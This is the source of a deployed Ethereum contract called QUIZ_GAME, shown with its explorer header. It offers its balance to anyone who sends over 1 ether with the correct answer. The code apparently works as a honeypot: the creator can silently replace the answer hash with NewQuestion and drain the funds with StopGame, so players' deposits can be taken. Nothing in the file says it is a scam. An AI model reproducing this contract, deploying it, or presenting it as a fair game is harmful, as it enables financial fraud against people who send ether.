
//Address: 0xB19117892E2B2aAa418E75F61D7D1C05F86B66Bd
//Contract name: QUIZ_GAME
//Balance: 0 Ether
//Verification Date: 4/8/2018
//Transacion Count: 4

// CODE STARTS HERE

pragma solidity ^0.4.19;

contract QUIZ_GAME
{
    string public Question;
 
    address questionSender;
  
    bytes32 responseHash;
 
    function StartGame(string _question,string _response)
    public
    payable
    {
        if(responseHash==0x0)
        {
            responseHash = keccak256(_response);
            Question = _question;
            questionSender = msg.sender;
        }
    }
    
    function Play(string _response)
    external
    payable
    {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value>1 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    
    function StopGame()
    public
    payable
    {
       require(msg.sender==questionSender);
       msg.sender.transfer(this.balance);
    }
    
    function() public payable{}
    
    function NewQuestion(string _question, bytes32 _responseHash)
    public
    payable
    {
        require(msg.sender==questionSender);
        responseHash = _responseHash;
        Question = _question;
    }
    
    
    
    
}
